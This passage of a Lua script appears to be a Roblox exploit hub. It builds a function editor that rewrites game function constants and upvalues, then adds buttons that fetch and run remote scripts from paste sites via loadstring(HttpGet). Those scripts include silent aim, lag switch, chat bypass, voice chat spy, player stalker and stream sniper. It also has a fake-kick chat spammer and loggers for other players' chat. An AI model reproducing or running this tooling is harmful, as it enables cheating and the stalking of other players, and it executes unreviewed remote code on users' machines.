action_3.BackgroundTransparency = 1.000
action_3.Position = UDim2.new(1, 0, 0, 0)
action_3.Size = UDim2.new(0, 40, 1, 0)
action_3.Font = Enum.Font.SourceSans
action_3.Text = "action"
action_3.TextColor3 = Color3.fromRGB(255, 255, 255)
action_3.TextSize = 14.000

up.Name = "up"
up.Parent = funcEditor
up.Active = true
up.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
up.BorderColor3 = Color3.fromRGB(255, 255, 255)
up.Position = UDim2.new(0, 0, 0, 55)
up.Size = UDim2.new(0, 300, 1, -55)
up.CanvasSize = UDim2.new(0, 0, 10, 0) 
up.ScrollBarThickness = 0

UIListLayout_3.Parent = up
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder

hide.Name = "hide"
hide.Parent = funcEditor
hide.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
hide.BorderColor3 = Color3.fromRGB(0, 0, 0)
hide.BorderSizePixel = 0
hide.Position = UDim2.new(1, -45, 0, 0)
hide.Size = UDim2.new(0, 45, 0, 25)
hide.Font = Enum.Font.SourceSans
hide.Text = "Hide(F8)"
hide.TextColor3 = Color3.fromRGB(255, 255, 255)
hide.TextSize = 14.000

mainFunc.Name = "mainFunc"
mainFunc.Parent = funcEditor
mainFunc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFunc.BorderSizePixel = 0
mainFunc.Position = UDim2.new(1, -250, 0, 0)
mainFunc.Size = UDim2.new(0, 80, 0, 25)
mainFunc.Font = Enum.Font.SourceSans
mainFunc.Text = "main function"
mainFunc.TextColor3 = Color3.fromRGB(255, 255, 255)
mainFunc.TextSize = 14.000

upFunc.Name = "upFunc"
upFunc.Parent = funcEditor
upFunc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
upFunc.BorderSizePixel = 0
upFunc.Position = UDim2.new(1, -150, 0, 0)
upFunc.Size = UDim2.new(0, 85, 0, 25)
upFunc.Font = Enum.Font.SourceSans
upFunc.Text = "upper function"
upFunc.TextColor3 = Color3.fromRGB(255, 255, 255)
upFunc.TextSize = 14.000

clearFuncEditor.Name = "clearFuncEditor"
clearFuncEditor.Parent = funcEditor
clearFuncEditor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
clearFuncEditor.BorderSizePixel = 0
clearFuncEditor.Position = UDim2.new(1, -325, 0, 0)
clearFuncEditor.Size = UDim2.new(0, 50, 0, 25)
clearFuncEditor.Font = Enum.Font.SourceSans
clearFuncEditor.Text = "clear"
clearFuncEditor.TextColor3 = Color3.fromRGB(255, 255, 255)
clearFuncEditor.TextSize = 14.000

FuncEditorButton.Name = "FuncEditorButton"
FuncEditorButton.Parent = main
FuncEditorButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FuncEditorButton.BackgroundTransparency = 1.000
FuncEditorButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
FuncEditorButton.BorderSizePixel = 0
FuncEditorButton.Size = UDim2.new(0, 150, 0, 25)
FuncEditorButton.Font = Enum.Font.SourceSans
FuncEditorButton.Text = "Function editor"
FuncEditorButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FuncEditorButton.TextSize = 25.000

ExplorerButton.Name = "ExplorerButton"
ExplorerButton.Parent = main
ExplorerButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExplorerButton.BackgroundTransparency = 1.000
ExplorerButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
ExplorerButton.BorderSizePixel = 0
ExplorerButton.Position = UDim2.new(0, 175, 0, 0)
ExplorerButton.Size = UDim2.new(0, 150, 0, 25)
ExplorerButton.Font = Enum.Font.SourceSans
ExplorerButton.Text = "Explorer"
ExplorerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExplorerButton.TextSize = 20.000

Explorer.Name = "Explorer"
Explorer.Parent = main
Explorer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Explorer.BackgroundTransparency = 1.000
Explorer.Size = UDim2.new(1, 0, 1, 0)
Explorer.Visible = false

editFrame.Name = "editFrame"
editFrame.Parent = main
editFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
editFrame.BorderSizePixel = 0
editFrame.Position = UDim2.new(1.0511111, 0, 0, 0)
editFrame.Size = UDim2.new(0, 200, 0, 150)
editFrame.Visible = false

title.Name = "title"
title.Parent = editFrame
title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
title.BorderColor3 = Color3.fromRGB(255, 255, 255)
title.Size = UDim2.new(0, 70, 0, 25)
title.Font = Enum.Font.SourceSans
title.Text = "value editor"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 14.000

confirm.Name = "confirm"
confirm.Parent = editFrame
confirm.AnchorPoint = Vector2.new(1, 1)
confirm.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
confirm.Position = UDim2.new(1, -5, 1, -5)
confirm.Size = UDim2.new(0, 50, 0, 25)
confirm.Font = Enum.Font.SourceSans
confirm.Text = "Confirm"
confirm.TextColor3 = Color3.fromRGB(0, 255, 0)
confirm.TextSize = 14.000

cancel.Name = "cancel"
cancel.Parent = editFrame
cancel.AnchorPoint = Vector2.new(0, 1)
cancel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
cancel.Position = UDim2.new(0, 5, 1, -5)
cancel.Size = UDim2.new(0, 50, 0, 25)
cancel.Font = Enum.Font.SourceSans
cancel.Text = "Cancel"
cancel.TextColor3 = Color3.fromRGB(255, 0, 0)
cancel.TextSize = 14.000

constantGUIelements.Name = "constantGUIelements"
constantGUIelements.Parent = editFrame
constantGUIelements.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
constantGUIelements.BackgroundTransparency = 1.000
constantGUIelements.Position = UDim2.new(0, 0, 0, 30)
constantGUIelements.Size = UDim2.new(0, 65, 0, 25)
constantGUIelements.Font = Enum.Font.SourceSans
constantGUIelements.Text = "prev value"
constantGUIelements.TextColor3 = Color3.fromRGB(255, 255, 255)
constantGUIelements.TextSize = 14.000

previousValue.Name = "previousValue"
previousValue.Parent = editFrame
previousValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
previousValue.BackgroundTransparency = 1.000
previousValue.Position = UDim2.new(0, 65, 0, 30)
previousValue.Size = UDim2.new(0, 135, 0, 25)
previousValue.Font = Enum.Font.SourceSans
previousValue.Text = "previous preview value"
previousValue.TextColor3 = Color3.fromRGB(255, 255, 255)
previousValue.TextSize = 14.000
previousValue.TextWrapped = true

constantGUIelements_2.Name = "constantGUIelements"
constantGUIelements_2.Parent = editFrame
constantGUIelements_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
constantGUIelements_2.BackgroundTransparency = 1.000
constantGUIelements_2.Position = UDim2.new(0, 0, 0, 60)
constantGUIelements_2.Size = UDim2.new(0, 65, 0, 25)
constantGUIelements_2.Font = Enum.Font.SourceSans
constantGUIelements_2.Text = "new value"
constantGUIelements_2.TextColor3 = Color3.fromRGB(255, 255, 255)
constantGUIelements_2.TextSize = 14.000

newValue.Name = "newValue"
newValue.Parent = editFrame
newValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
newValue.BackgroundTransparency = 1.000
newValue.Position = UDim2.new(0, 65, 0, 60)
newValue.Size = UDim2.new(0, 135, 0, 25)
newValue.ClearTextOnFocus = false
newValue.Font = Enum.Font.SourceSans
newValue.PlaceholderText = "new value"
newValue.Text = ""
newValue.TextColor3 = Color3.fromRGB(255, 255, 255)
newValue.TextSize = 14.000

number.Name = "number"
number.Parent = editFrame
number.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
number.BorderSizePixel = 0
number.Position = UDim2.new(0, 90, 0, 90)
number.Size = UDim2.new(0, 50, 0, 20)
number.Font = Enum.Font.SourceSans
number.Text = "number"
number.TextColor3 = Color3.fromRGB(255, 0, 0)
number.TextSize = 14.000

bool.Name = "bool"
bool.Parent = editFrame
bool.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bool.BorderSizePixel = 0
bool.Position = UDim2.new(0, 50, 0, 90)
bool.Size = UDim2.new(0, 30, 0, 20)
bool.Font = Enum.Font.SourceSans
bool.Text = "bool"
bool.TextColor3 = Color3.fromRGB(255, 0, 0)
bool.TextSize = 14.000

stringV.Name = "string"
stringV.Parent = editFrame
stringV.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
stringV.BorderSizePixel = 0
stringV.Position = UDim2.new(0, 150, 0, 90)
stringV.Size = UDim2.new(0, 50, 0, 20)
stringV.Font = Enum.Font.SourceSans
stringV.Text = "string"
stringV.TextColor3 = Color3.fromRGB(255, 0, 0)
stringV.TextSize = 14.000

constantGUIelements_3.Name = "constantGUIelements"
constantGUIelements_3.Parent = editFrame
constantGUIelements_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
constantGUIelements_3.BackgroundTransparency = 1.000
constantGUIelements_3.Position = UDim2.new(0, 0, 0, 90)
constantGUIelements_3.Size = UDim2.new(0, 40, 0, 20)
constantGUIelements_3.Font = Enum.Font.SourceSans
constantGUIelements_3.Text = "type"
constantGUIelements_3.TextColor3 = Color3.fromRGB(255, 255, 255)
constantGUIelements_3.TextSize = 14.000

editWithCode.Name = "editWithCode"
editWithCode.Parent = editFrame
editWithCode.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
editWithCode.BorderColor3 = Color3.fromRGB(255, 255, 255)
editWithCode.Position = UDim2.new(0, 125, 0, 0)
editWithCode.Size = UDim2.new(0, 75, 0, 25)
editWithCode.Font = Enum.Font.SourceSans
editWithCode.Text = "Edit with lua"
editWithCode.TextColor3 = Color3.fromRGB(255, 255, 255)
editWithCode.TextSize = 14.000

local nn = 0
local notify = function(t,m)
	spawn(function()
		if nn < 4 then
			nn += 1
			game.StarterGui:SetCore("SendNotification",{
				Title = tostring(t);
				Text = tostring(m);
				Duration = 5;})
			wait(5)
			nn -= 1
		end
	end)
end

function addValFrame(parent,i,v,s)
	local valFrame = Instance.new("Frame")
	local index_4 = Instance.new("TextLabel")
	local value = Instance.new("TextLabel")
	local action_4 = Instance.new("TextButton")
	
	valFrame.Name = "valFrame"
	valFrame.Parent = parent
	valFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	valFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
	valFrame.Size = UDim2.new(1, 0, 0, 25)
	
	index_4.Name = "index"
	index_4.Parent = valFrame
	index_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	index_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
	index_4.Size = UDim2.new(0.100000001, 0, 1, 0)
	index_4.Font = Enum.Font.SourceSans
	index_4.Text = tostring(i)
	index_4.TextColor3 = Color3.fromRGB(255, 255, 255)
	index_4.TextSize = 14.000
	
	value.Name = "value"
	value.Parent = valFrame
	value.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	value.BorderColor3 = Color3.fromRGB(255, 255, 255)
	value.Position = UDim2.new(0.100000001, 0, 0, 0)
	value.Size = UDim2.new(0.725000024, 0, 1, 0)
	value.Font = Enum.Font.SourceSans
	value.Text = tostring(v)
	value.TextColor3 = Color3.fromRGB(255, 255, 255)
	value.TextSize = 14.000
	value.TextWrapped = true
	
	action_4.Name = "action"
	action_4.Parent = valFrame
	action_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	action_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
	action_4.Position = UDim2.new(0.824999988, 0, 0, -1)
	action_4.Size = UDim2.new(0.174999997, 0, 0, 25)
	action_4.Font = Enum.Font.SourceSans
	action_4.Text = s
	action_4.TextColor3 = Color3.fromRGB(255, 255, 255)
	action_4.TextSize = 14.000
	return valFrame,action_4
end
--addValFrame(index,value,action text)

function clearDisplay(obj)
	for i,v in pairs(obj:GetChildren())do
		if not v:IsA("UIListLayout")then
			v:Destroy()
		end
	end
end
local selectedType;

bool.MouseButton1Click:Connect(function()
	bool.TextColor3 	= Color3.fromRGB(0,255,0)
	number.TextColor3 	= Color3.fromRGB(255,0,0)
	stringV.TextColor3 	= Color3.fromRGB(255,0,0)
	selectedType = "bool"
end)
stringV.MouseButton1Click:Connect(function()
	bool.TextColor3 	= Color3.fromRGB(255,0,0)
	number.TextColor3 	= Color3.fromRGB(255,0,0)
	stringV.TextColor3 	= Color3.fromRGB(0,255,0)
	selectedType = "string"
end)
number.MouseButton1Click:Connect(function()
	bool.TextColor3 	= Color3.fromRGB(255,0,0)
	number.TextColor3 	= Color3.fromRGB(0,255,0)
	stringV.TextColor3 	= Color3.fromRGB(255,0,0)
	selectedType = "number"
end)

function editValue(func,index,currentValue,typeSet)
	previousValue.Text = tostring(currentValue)
	
	selectedType = type(currentValue);
	
	if selectedType =="bool" then
		bool.TextColor3 	= Color3.fromRGB(0,255,0)
		number.TextColor3 	= Color3.fromRGB(255,0,0)
		stringV.TextColor3 	= Color3.fromRGB(255,0,0)
	elseif selectedType == "string" then
		bool.TextColor3 	= Color3.fromRGB(255,0,0)
		number.TextColor3 	= Color3.fromRGB(255,0,0)
		stringV.TextColor3 	= Color3.fromRGB(0,255,0)
	elseif selectedType == "number" then
		bool.TextColor3 	= Color3.fromRGB(255,0,0)
		number.TextColor3 	= Color3.fromRGB(0,255,0)
		stringV.TextColor3 	= Color3.fromRGB(255,0,0)
	else
		bool.TextColor3 	= Color3.fromRGB(255,0,0)
		number.TextColor3 	= Color3.fromRGB(255,0,0)
		stringV.TextColor3 	= Color3.fromRGB(255,0,0)
	end
	local toSet;
	local confirmCon;
	confirmCon=confirm.MouseButton1Click:Connect(function()
		if selectedType == "bool" then
			if newValue.Text == "true" then
				toSet = true
			elseif newValue.Text == "false"then
				toSet = false
			end
		elseif selectedType == "number" then
			if tonumber(newValue.Text) then
				toSet = tonumber(newValue.Text)
			end
		elseif selectedType == "string" then
			toSet = newValue.Text
		end
		if toSet then
			if typeSet == "constant" then
				debug.setconstant(func,index,toSet)
				editFrame.Visible = false
				confirmCon:Disconnect()
				editfunc(func)
			elseif typeSet == "upvalue" then
				debug.setupvalue(func,index,toSet)
				editFrame.Visible = false
				confirmCon:Disconnect()
				editfunc(func)
			end
		end
	end)
	local cancelCon;
	cancelCon=cancel.MouseButton1Click:Connect(function()
		confirmCon:Disconnect()
		cancelCon:Disconnect()
		previousValue.Text = "previous value preview"
		bool.TextColor3 	= Color3.fromRGB(255,0,0)
		number.TextColor3 	= Color3.fromRGB(255,0,0)
		stringV.TextColor3 	= Color3.fromRGB(255,0,0)
		editFrame.Visible = false
	end)
	newValue.Text = ""
	editFrame.Visible = true
end

local CurrentMainFunc = nil;

indexTrace = {}

function getFunc()
	local currentFunc
	if #indexTrace == 0 then
		return CurrentMainFunc
	end
	for i,v in pairs(indexTrace)do
		if currentFunc then
			if v.traceType == "proto"then
				local proto = debug.getproto(currentFunc,v.index)
				currentFunc = proto
				print("use proto")
			elseif v.traceType == "upvalue"then
				local upval = debug.getupvalue(currentFunc,v.index)
				currentFunc = upval
				print("use upval")
			elseif v.traceType == "const"then
				local const = debug.getconstant(currentFunc,v.index)
				currentFunc = const
				print("use const")
			end
		else
			if v.traceType == "proto"then
				local proto = debug.getproto(CurrentMainFunc,v.index)
				currentFunc = proto
				print("use proto")
			elseif v.traceType == "upvalue"then
				local upval = debug.getupvalue(CurrentMainFunc,v.index)
				currentFunc = upval
				print("use upval")
			elseif v.traceType == "const"then
				local const = debug.getconstant(CurrentMainFunc,v.index)
				currentFunc = const
				print("use const")
			end
		end
	end
	return currentFunc
end

function editfunc(func,isMain,indexOfFunc,typeForTrace,ignoreIsMain)
	if not func or type(func)~='function'then 
		error("No args about function. Invalid argument function expected. Try again.")
	end
	
	if isMain == nil then
		isMain = true
	end
	
	local constants,upvals,protos
	local s,e = pcall(function()
		constants = debug.getconstants(func)
		upvals = debug.getupvalues(func)
		protos = debug.getprotos(func)
	end)
	if s then
		clearDisplay(up)
		clearDisplay(const)
		clearDisplay(funcs)
		up.CanvasPosition = Vector2.new()
		const.CanvasPosition = Vector2.new()
		funcs.CanvasPosition = Vector2.new()
	else
		notify(e)
		return
	end
	
	if isMain then
		CurrentMainFunc = func
		indexTrace = {}
	elseif not ignoreIsMain then
		local trace = {}
		trace.traceType = typeForTrace;
		trace.index = indexOfFunc;
		indexTrace[#indexTrace+1]=trace
	end
	
	for i,v in pairs(upvals)do
		if type(v)=="function" then
			local frame,action = addValFrame(up,i,v,"display")
			action.MouseButton1Click:Connect(function()
				editfunc(v,false,'up')
			end)
		else
			local frame,action = addValFrame(up,i,v,"edit")
			action.MouseButton1Click:Connect(function()
				editValue(func,i,v,"upvalue")
			end)
		end
	end
	
	for i,v in pairs(constants)do
		if type(v)=="function" then
			local frame,action = addValFrame(const,i,v,"display")
			action.MouseButton1Click:Connect(function()
				editfunc(v,false,i,"const")
			end)
		else
			local frame,action = addValFrame(const,i,v,"edit")
			action.MouseButton1Click:Connect(function()
				editValue(func,i,v,"constant")
			end)
		end
	end
	
	for i,v in pairs(protos)do
		if type(v)=="function" then
			local frame,action = addValFrame(funcs,i,v,"display")
			action.MouseButton1Click:Connect(function()
				editfunc(v,false,i,"proto")
			end)
		else
			local frame,action = addValFrame(funcs,i,v,"???")
		end
	end
end

upFunc.MouseButton1Click:Connect(function()
	table.remove(indexTrace,#indexTrace)
	local func = getFunc()
	editfunc(func,false,nil,nil,true)
end)
mainFunc.MouseButton1Click:Connect(function()
	if CurrentMainFunc then
		editfunc(CurrentMainFunc,true)
	end
end)
clearFuncEditor.MouseButton1Click:Connect(function()
	clearDisplay(up)
	clearDisplay(const)
	clearDisplay(funcs)
	CurrentMainFunc = nil
	indexTrace = {}
	
	up.CanvasPosition = Vector2.new()
	const.CanvasPosition = Vector2.new()
	funcs.CanvasPosition = Vector2.new()
end)

function getcurrentfunc()
	return getFunc()
end

getgenv().getcrreunt = getcurrentfunc
getgenv().editfunc = editfunc


game:GetService("UserInputService").InputBegan:Connect(function(input,proccessed)
	if not proccessed then
		if input.KeyCode == Enum.KeyCode.F8 then
			gui.Enabled = not gui.Enabled
		end
	end
end)
hide.MouseButton1Click:Connect(function()
	gui.Enabled = not gui.Enabled
end)
loadstring(game:HttpGet("https://pastebin.com/raw/PiJXMBr6"))()(main)
  	end    
})

Function:AddButton({
	Name = "Filtering Enabled Print-Check",
	Callback = function()
      	if game.Workspace.FilteringEnabled == true then
		   print("It's enabled - true")
		else
		   print("It's disabled - false")
		  end 	  
  	end    
})

Script:AddToggle({
	Name = "Fake Kick",
	Default = false,
	Callback = function(fkick)
		if fkick == true then
               if fakekicktbl ~= nil then
                  fakekicktbl:Disconnect()
               end
               local Players = game:GetService("Players")

fakekicktbl = Players.PlayerRemoving:Connect(function(player)

local args = {
    [1] = ":kick "..player.Name,
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
          else
               fkick = false
               if fakekicktbl ~= nil then
                  fakekicktbl:Disconnect()
               end
	end
  end    
})

Script:AddButton({
	Name = "Chat Translator [Request]",
	Callback = function()
	    game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If it's not work for you, then: 1) It's not for synapse x (maybe) and that uses request, which synapse x can't use it (maybe) but others for example krnl, electron, they can support this. Try with syn.request not request.", Duration = 15,})
	    loadstring(game:HttpGet("https://paste.ee/r/Rranu", true))()
  	end    
})

Script:AddButton({
	Name = "Chat Translator [Syn.Request]",
	Callback = function()
	    game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If it's not work for you, then: 1) It's for synapse x and that uses syn.request, which nobody can use it expect synapse x. Try with request not syn.request.", Duration = 10,})
	    loadstring(game:HttpGet("https://paste.ee/r/RjC9O", true))()
  	end    
})

Script:AddButton({
	Name = "Universal Silent Aim",
	Callback = function()
	    loadstring(game:HttpGet("https://paste.ee/r/QMOEj", true))()
  	end    
})

Script:AddButton({
	Name = "Creo's Model Grabber",
	Callback = function()
        OrionLib:MakeNotification({
	Name = "Model Grabber Tutorial",
	Content = "To start, you need to launch roblox studio and create place. After you need to create 'Script' in Workspace. When you did it, you need to paste the code which was copied to clipboard. Now, just press 'Play' or 'Test'.",
	Image = "rbxassetid://6023426945",
	Time = 25
})
	    loadstring(game:HttpGet("https://paste.ee/r/IaRXx", true))()
  	end    
})

Script:AddButton({
	Name = "Shed's Chat Bypasser V3",
	Callback = function()
	    loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
  	end    
})

Script:AddButton({
	Name = "Chat Logs",
	Callback = function()
	    -- Farewell Infortality.
-- Version: 2.82
-- Instances:
local ChatGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local LogPanel = Instance.new("ScrollingFrame")
local Close = Instance.new("TextButton")
local Mini = Instance.new("TextButton")
local Log = Instance.new("TextButton")
local title = Instance.new("TextLabel")
--Properties:
ChatGui.Name = "ChatGui"
ChatGui.Parent = game.Players.LocalPlayer.PlayerGui
ChatGui.ResetOnSpawn = false

Frame.Parent = ChatGui
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.0278396439, 0, 0.565217376, 0)
Frame.Size = UDim2.new(0, 392, 0, 25)
Frame.Active = true
Frame.Draggable = true

LogPanel.Name = "LogPanel"
LogPanel.Parent = Frame
LogPanel.BackgroundColor3 = Color3.new(0, 0, 0)
LogPanel.BorderColor3 = Color3.new(0.223529, 0.223529, 0.223529)
LogPanel.Position = UDim2.new(-0.000221580267, 0, 0.968695641, 0)
LogPanel.Size = UDim2.new(0, 392, 0, 203)
LogPanel.ScrollBarThickness = 5
LogPanel.ScrollingEnabled = true
LogPanel.CanvasSize=UDim2.new(2,0,100,0)

Close.Name = "Close"
Close.Parent = Frame
Close.BackgroundColor3 = Color3.new(1, 1, 1)
Close.BackgroundTransparency = 1
Close.Position = UDim2.new(0.823979557, 0, 0.0399999991, 0)
Close.Size = UDim2.new(0, 69, 0, 24)
Close.Font = Enum.Font.SourceSans
Close.Text = "Close"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.TextSize = 14

Mini.Name = "Mini"
Mini.Parent = Frame
Mini.BackgroundColor3 = Color3.new(1, 1, 1)
Mini.BackgroundTransparency = 1
Mini.Position = UDim2.new(0.647959173, 0, 0, 0)
Mini.Size = UDim2.new(0, 69, 0, 24)
Mini.Font = Enum.Font.SourceSans
Mini.Text = "Minimize"
Mini.TextColor3 = Color3.new(1, 1, 1)
Mini.TextSize = 14

Log.Name = "Log"
Log.Parent = Frame
Log.BackgroundColor3 = Color3.new(1, 1, 1)
Log.BackgroundTransparency = 1
Log.Position = UDim2.new(0.293367326, 0, 0, 0)
Log.Size = UDim2.new(0, 69, 0, 24)
Log.Font = Enum.Font.SourceSans
Log.Text = "Log Chat [ON]"
Log.TextColor3 = Color3.new(1, 1, 1)
Log.TextSize = 14

title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 115, 0, 24)
title.Font = Enum.Font.SourceSans
title.Text = "Chat GUI"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Left
-- Scripts:
local logging = true
local minimized = false
Log.MouseButton1Down:Connect(function()
	logging = not logging
	if logging then Log.Text = "Log Chat [ON]" else Log.Text = "Log Chat [OFF]" end
end)
Mini.MouseButton1Down:Connect(function()
	if minimized then
		LogPanel:TweenSize(UDim2.new(0, 392, 0, 203), "InOut", "Sine", 0.5, false, nil)
	else
		LogPanel:TweenSize(UDim2.new(0, 392, 0, 0), "InOut", "Sine", 0.5, false, nil)
	end
	minimized = not minimized
end)
Close.MouseButton1Down:Connect(function()
	ChatGui:Destroy()
end)

local prevOutputPos = 0
function output(plr, msg)
	if not logging then return end
	local colour = Color3.fromRGB(255,255,255)
	
	if string.sub(msg, 1,1) == ":" or string.sub(msg,1,1) == ";" then colour = Color3.fromRGB(255,0,0) elseif string.sub(msg,1,2) == "/w" or string.sub(msg,1,7) == "/whisper" or string.sub(msg,1,5) == "/team" or string.sub(msg,1,2) == "/t" then colour = Color3.fromRGB(0,0,255) else colour = Color3.fromRGB(255,255,255) end
	
 	local o = Instance.new("TextLabel",LogPanel)
 	o.Text = plr.Name .. ": " .. msg
 	o.Size = UDim2.new(0.5,0,.006,0)
 	o.Position = UDim2.new(0,0,.007 + prevOutputPos ,0)
 	o.Font = Enum.Font.SourceSansSemibold
 	o.TextColor3 = colour
 	o.TextStrokeTransparency = 0
 	o.BackgroundTransparency = 0
	o.BackgroundColor3 = Color3.new(0,0,0)
 	o.BorderSizePixel = 0
	o.BorderColor3 = Color3.new(0,0,0)
 	o.FontSize = "Size14"
	o.TextXAlignment = Enum.TextXAlignment.Left
 	o.ClipsDescendants = true
	prevOutputPos = prevOutputPos + 0.007
	end

for i,v in pairs(game.Players:GetChildren()) do
	v.Chatted:Connect(function(msg)
		output(v, msg)
	end)
end

game.Players.ChildAdded:Connect(function(plr)
	if plr:IsA("Player") then
		plr.Chatted:Connect(function(msg)
			output(plr, msg)
		end)
	end
end)
  	end    
})

Script:AddButton({
	Name = "Chat Logs (Print version)",
	Callback = function()
	    for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
        print(v.Name, ":", msg)
   end)
end

game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       print(v.Name, ":", msg)
   end)
end)
  	end    
})

Script:AddButton({
	Name = "Find Small Server",
	Callback = function()
	    local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place = game.PlaceId
local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
function ListServers(cursor)
   local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
   return Http:JSONDecode(Raw)
end

local Server, Next; repeat
   local Servers = ListServers(Next)
   Server = Servers.data[1]
   Next = Servers.nextPageCursor
until Server

TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
  	end    
})

Script:AddButton({
	Name = "Lag Switch [X]",
	Callback = function()
	    loadstring(game:HttpGet("https://paste.ee/r/WvLU6", true))()
  	end    
})

Script:AddButton({
	Name = "BTools",
	Callback = function()
	    Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 1
	Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 2
	Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 3
	Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 4
  	end    
})

Script:AddButton({
	Name = "F3X [Client]",
	Callback = function()
	    loadstring(game:GetObjects("rbxassetid://4698064966")[1].Source)()
  	end    
})

Script:AddButton({
	Name = "Server Finder GUI",
	Callback = function()
	    loadstring(game:HttpGet("https://paste.ee/r/w3kXN", true))()
  	end    
})

Script:AddButton({
	Name = "Stream Sniper GUI",
	Callback = function()
	    loadstring(game:HttpGet("https://paste.ee/r/SDqxo", true))()
  	end    
})

Script:AddButton({
	Name = "Team Changer GUI",
	Callback = function()
	    loadstring(game:HttpGet("https://paste.ee/r/uQAAd", true))()
  	end    
})

Script:AddButton({
	Name = "VoiceChat Spy GUI",
	Callback = function()
        getgenv().VoicechatSpySettings = {
    TrackVoice3d = false,
    FollowDistance = 0
}
       
	    loadstring(game:HttpGet("https://paste.ee/r/4HQro", true))()
  	end    
})

Script:AddButton({
	Name = "Player Stalker GUI",
	Callback = function()
	    loadstring(game:HttpGet("https://paste.ee/r/vfmOp", true))()
  	end    
})

Setting:AddSlider({
	Name = "Game Volume",
	Min = 0,
	Max = 10,
	Default = PlayerVolumeBELIKE,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Volume",
	Callback = function(Volumelol)
		UserSettings():GetService("UserGameSettings").MasterVolume = Volumelol
	end    
})

Setting:AddSlider({
	Name = "Game Graphics",
	Min = 0,
	Max = 15,
	Default = 15,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Graphics",
	Callback = function(graphicslol)
		settings().Rendering.QualityLevel = graphicslol
	end    
})

Setting:AddSlider({
	Name = "Game FOV",
	Min = 0,
	Max = 120,
	Default = game.Workspace.CurrentCamera.FieldOfView,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "FOV",
	Callback = function(fovlol)
		game.Workspace.CurrentCamera.FieldOfView = fovlol
	end    
})

Setting:AddSlider({
	Name = "Mouse Sensitivity",
	Min = 0,
	Max = 10,
	Default = UserInputService.MouseDeltaSensitivity,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Sens",
	Callback = function(msyes)
		UserInputService.MouseDeltaSensitivity = msyes
	end    
})

Setting:AddTextbox({
	Name = "Data Limit",
	Default = "",
	TextDisappear = true,
	Callback = function(DT)
		local ValueDT = tonumber(DT)
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(ValueDT)
	end	  
})

Setting:AddButton({
	Name = "Toggle Record",
	Callback = function()
	    game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If you want to turn off, then just press again or F12", Duration = 4,})
	    return game:GetService("CoreGui"):ToggleRecording()
  	end    
})

Setting:AddButton({
	Name = "Take ScreenShot",
	Callback = function()
	    return game:GetService("CoreGui"):TakeScreenshot()
  	end    
})

Setting:AddButton({
	Name = "Toggle FullScreen",
	Callback = function()
	    game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If you want to get back your unfullscreen, then press again or F11.", Duration = 4,})
	    return game:GetService("GuiService"):ToggleFullscreen()
  	end    
})

Setting:AddButton({
	Name = "Notify Ping",
	Callback = function()
